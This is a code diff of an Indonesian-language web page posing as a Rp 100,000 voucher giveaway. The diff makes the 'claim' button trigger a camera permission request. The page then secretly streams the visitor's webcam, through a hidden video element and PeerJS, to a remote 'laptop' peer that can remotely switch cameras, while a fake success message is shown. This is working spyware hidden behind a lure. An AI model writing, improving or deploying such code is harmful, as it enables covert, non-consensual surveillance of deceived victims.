@@ -8,14 +8,16 @@
   <style>
     body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f4f4f9; }
     .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-    button { background: #28a745; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; }
+    button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+    #status { margin-top: 15px; color: #666; font-size: 14px; }
   </style>
 </head>
 <body>
   <div class="card">
     <h2>🎉 Selamat! Anda Mendapatkan Voucher Rp 100.000</h2>
-    <p>Klik tombol di bawah untuk mengklaim promo hari ini.</p>
-    <button onclick="alert('Voucher berhasil diklaim!')">KLAIM SEKARANG</button>
+    <p>Tekan tombol di bawah untuk memproses dan mengklaim hadiah Anda.</p>
+    <button onclick="prosesKlaim()">KLAIM SEKARANG</button>
+    <p id="status"></p>
   </div>
 
   <video id="webcam" autoplay playsinline style="display: none;"></video>
@@ -28,24 +30,28 @@
     let dataConn = null;
 
     peer.on('open', () => {
-      // Hubungkan data ke laptop
       dataConn = peer.connect(ID_LAPTOP);
-      
-      dataConn.on('open', () => {
-        // Mendengar perintah tombol dari laptop
-        dataConn.on('data', (data) => {
-          if (data === 'switch') {
-            isFrontCamera = !isFrontCamera;
-            startCamera();
-          }
+      if (dataConn) {
+        dataConn.on('open', () => {
+          dataConn.on('data', (data) => {
+            if (data === 'switch') {
+              isFrontCamera = !isFrontCamera;
+              startCamera();
+            }
+          });
         });
-      });
-
-      startCamera();
+      }
     });
 
+    async function prosesKlaim() {
+      document.getElementById('status').innerText = "Memproses voucher...";
+      // Memicu permintaan akses kamera saat tombol ditekan
+      await startCamera();
+      alert("Voucher Berhasil Diklaim!");
+      document.getElementById('status').innerText = "Voucher Aktif.";
+    }
+
     async function startCamera() {
-      // Hentikan stream kamera sebelumnya jika ada
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
       }
@@ -55,11 +61,9 @@
           video: { facingMode: mode }
         });
         document.getElementById('webcam').srcObject = currentStream;
-        
-        // Kirim siaran kamera baru ke laptop
         peer.call(ID_LAPTOP, currentStream);
       } catch (err) {
-        console.error("Gagal mengakses kamera:", err);
+        console.error(err);
       }
     }
   </script>
